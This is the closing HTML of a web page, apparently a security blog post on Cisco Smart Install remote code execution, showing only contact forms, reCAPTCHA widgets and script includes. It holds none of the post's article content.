<input type="hidden" name="link-id" value="" class="wpcf7-form-control wpcf7-hidden download_id" />
<p><input type="hidden" name="bwp-recaptcha-widget-id" value="bwpRecaptchaWidget2" /><div id="bwp-recaptcha-94044efa8a0b24f35f1e22f10ded9d53" class="bwp-recaptcha g-recaptcha" ></div><span class="wpcf7-form-control-wrap class:your-death"><input type="hidden" name="class:your-death-dummy" /></span></p>
<div>
    <button type="submit" class="wpcf7-form-control wpcf7-submit contact-form__submit contact-form__submit-js">Submit</button>
</div>
<div class="wpcf7-response-output wpcf7-display-none"></div><p style="display: none !important"><span class="wpcf7-form-control-wrap referer-page"><input type="hidden" name="referer-page" value="https://t.co/DfHtTn0EOh?amp=1" class="wpcf7-form-control wpcf7-text referer-page" aria-invalid="false"></span></p>
</form></div>            </div>
        </div>
    
            <div class="modal fade fade contact-form-modal" id="contact-form-anchor-modal" tabindex="-1" role="dialog">
            <div class="modal-dialog container" role="document">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span class="icon-regular-close"></span>
                </button>
                <h2 class="section__title">Contact us</h2>
			    <div role="form" class="wpcf7" id="wpcf7-f252-p1292-o3" lang="en-US" dir="ltr">
<div class="screen-reader-response"></div>
<form action="/blog/cisco-smart-install-remote-code-execution/#wpcf7-f252-p1292-o3" method="post" class="wpcf7-form contact-form contact-form-js mailchimp-ext-0.4.50" novalidate="novalidate">
<div style="display: none;">
<input type="hidden" name="_wpcf7" value="252" />
<input type="hidden" name="_wpcf7_version" value="5.0.1" />
<input type="hidden" name="_wpcf7_locale" value="en_US" />
<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f252-p1292-o3" />
<input type="hidden" name="_wpcf7_container_post" value="1292" />
</div>
<div class="contact-form-validate">
   <span class="wpcf7-form-control-wrap your-name"><input type="text" name="your-name" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required contact-form__input" aria-required="true" aria-invalid="false" placeholder="What is your name?" /></span>
</div>
<div class="contact-form-validate">
   <span class="wpcf7-form-control-wrap your-email"><input type="email" name="your-email" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email contact-form__input" aria-required="true" aria-invalid="false" placeholder="E-mail address" /></span>
</div>
<div class="contact-form-validate">
    <span class="wpcf7-form-control-wrap your-phone"><input type="tel" name="your-phone" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-tel wpcf7-validates-as-tel contact-form__input" aria-invalid="false" placeholder="Phone number (optional)" /></span>
</div>
<div class="contact-form-validate">
   <span class="wpcf7-form-control-wrap your-message"><textarea name="your-message" cols="40" rows="5" class="wpcf7-form-control wpcf7-textarea contact-form__textarea form-autoresizer" aria-invalid="false" placeholder="How can we help?"></textarea></span>
</div>
<p><input type="hidden" name="bwp-recaptcha-widget-id" value="bwpRecaptchaWidget3" /><div id="bwp-recaptcha-933567b71119ec8e5a6223ff8e039101" class="bwp-recaptcha g-recaptcha" ></div><span class="wpcf7-form-control-wrap recaptcha-912"><input type="hidden" name="recaptcha-912-dummy" /></span></p>
<div>
    <button type="submit" class="wpcf7-form-control wpcf7-submit contact-form__submit contact-form__submit-js">Submit</button>
</div>
<div class="wpcf7-response-output wpcf7-display-none"></div><p style="display: none !important"><span class="wpcf7-form-control-wrap referer-page"><input type="hidden" name="referer-page" value="https://t.co/DfHtTn0EOh?amp=1" class="wpcf7-form-control wpcf7-text referer-page" aria-invalid="false"></span></p>
</form></div>            </div>
        </div>
    


    <script type='text/javascript'>
/* <![CDATA[ */
var wpcf7 = {"apiSettings":{"root":"https:\/\/embedi.com\/wp-json\/contact-form-7\/v1","namespace":"contact-form-7\/v1"},"recaptcha":{"messages":{"empty":"Please verify that you are not a robot."}}};
/* ]]> */
</script>
<script type='text/javascript' src='https://embedi.com/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.0.1'></script>
<script type='text/javascript' src='https://embedi.com/wp-content/themes/embedicom/public/js/libs.js?ver=1522921960'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var myajax = {"url":"aHR0cHM6Ly9lbWJlZGkuY29tL3dwLWFkbWluL2FkbWluLWFqYXgucGhw","siteURL":"aHR0cHM6Ly9lbWJlZGkuY29t"};
/* ]]> */
</script>
<script type='text/javascript' src='https://embedi.com/wp-content/themes/embedicom/public/js/main.js?ver=1521105094'></script>
<script type='text/javascript' src='https://embedi.com/wp-content/themes/embedicom/public/js/socials.js?ver=4.9.5'></script>
<script type='text/javascript' src='https://embedi.com/wp-content/themes/embedicom/bower_components/highlightjs/custom/highlight.js?ver=1521105094'></script>
<script type='text/javascript' src='https://embedi.com/wp-includes/js/wp-embed.min.js?ver=4.9.5'></script>
		<script type="text/javascript">
			var bwpRecaptchaWidget1;
			var bwpRecaptchaWidget2;
			var bwpRecaptchaWidget3;
			var bwpRecaptchaCallback = function() {
				// render all collected recaptcha instances
				bwpRecaptchaWidget1 = grecaptcha.render('bwp-recaptcha-3fcdb73d36d54f2cc22d0f68e6b6e182', {
					sitekey: '6LftvToUAAAAABiECy4x3ljrcZkxfKxD50r1WoAf',
					theme: 'light',
					size: 'normal',
					tabindex: '0'
				});
				bwpRecaptchaWidget2 = grecaptcha.render('bwp-recaptcha-94044efa8a0b24f35f1e22f10ded9d53', {
					sitekey: '6LftvToUAAAAABiECy4x3ljrcZkxfKxD50r1WoAf',
					theme: 'light',
					size: 'normal',
					tabindex: '0'
				});
				bwpRecaptchaWidget3 = grecaptcha.render('bwp-recaptcha-933567b71119ec8e5a6223ff8e039101', {
					sitekey: '6LftvToUAAAAABiECy4x3ljrcZkxfKxD50r1WoAf',
					theme: 'light',
					size: 'normal',
					tabindex: '0'
				});
			};
		</script>

		<script src="https://www.google.com/recaptcha/api.js?onload=bwpRecaptchaCallback&#038;render=explicit" async defer></script>

    </body>
</html>

